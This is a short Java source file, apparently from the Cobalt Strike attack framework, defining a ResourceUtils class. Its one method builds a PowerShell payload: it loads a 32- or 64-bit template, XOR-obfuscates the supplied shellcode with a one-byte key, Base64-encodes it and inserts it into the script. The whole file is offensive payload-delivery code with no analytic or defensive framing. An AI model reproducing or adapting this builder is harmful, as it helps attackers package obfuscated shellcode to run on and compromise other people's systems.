package common;

import aggressor.AggressorClient;
import encoders.Base64;

import java.io.IOException;
import java.io.InputStream;

public class ResourceUtils extends BaseResourceUtils {

    public ResourceUtils(AggressorClient aggressorClient) {
        super(aggressorClient);
    }

    public byte[] _buildPowerShell(byte[] arrby, boolean bl) {
        try {
            InputStream inputStream = CommonUtils.resource(bl ? "resources/template.x64.ps1" : "resources/template.x86.ps1");
            byte[] arrby1 = CommonUtils.readAll(inputStream);
            inputStream.close();
            String str = CommonUtils.bString(arrby1);
            byte[] arrby2 = new byte[1];
            arrby2[0] = 35;
            arrby = CommonUtils.XorString(arrby, arrby2);
            str = CommonUtils.strrep(str, "%%DATA%%", Base64.encode(arrby));
            return CommonUtils.toBytes(str);
        } catch (IOException iOException) {
            MudgeSanity.logException("buildPowerShell", iOException, false);
            return new byte[0];
        }
    }
}
